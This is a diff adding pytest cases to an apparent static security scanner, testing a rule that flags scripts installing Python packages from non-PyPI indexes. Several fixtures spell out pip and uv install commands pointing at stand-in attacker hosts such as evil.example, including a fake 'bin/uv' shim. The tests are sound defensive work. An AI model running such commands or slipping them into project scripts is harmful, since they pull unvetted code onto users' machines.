@@ -245,3 +245,26 @@ def test_every_emitted_rule_id_in_catalog():
     assert seen <= set(CATALOG)
     for rid, info in CATALOG.items():
         assert info.id == rid and info.title and info.why and info.fix
+
+
+@pytest.mark.parametrize("rel,text", [
+    ("bin/uv", "#!/bin/sh\npython3 -m pip install --index-url https://pypi.evil.example/simple helperlib\n"),
+    ("setup.sh", "pip install -i https://evil.example/simple helperlib\n"),
+    ("setup.sh", "pip3 install --extra-index-url=https://evil.example/simple x\n"),
+    ("scripts/boot.sh", "uv pip install --index-url 'http://10.0.0.1/simple' x\n"),
+    ("run.py", "import subprocess\nsubprocess.run(['pip', 'install', '--index-url', 'https://evil.example/s', 'x'])\n"),
+])
+def test_pip_install_from_non_pypi_index_is_med(rel, text):
+    """Fix round 2 (M8 note): a shipped script installing from another index fetches unscanned code."""
+    got = [f for f in run_static_rules([ScanFile(rel, text)], []) if f.rule == "install.custom-index"]
+    assert got and got[0].severity == Severity.MED, rel
+
+
+@pytest.mark.parametrize("text", [
+    "pip install --index-url https://pypi.org/simple x\n",
+    "pip install -i https://pypi.org/simple/ x\n",
+    "pip install requests\n",
+    "pip install -r requirements.txt\n",
+])
+def test_pip_install_from_pypi_is_not_flagged(text):
+    assert not [f for f in run_static_rules([ScanFile("setup.sh", text)], []) if f.rule == "install.custom-index"]
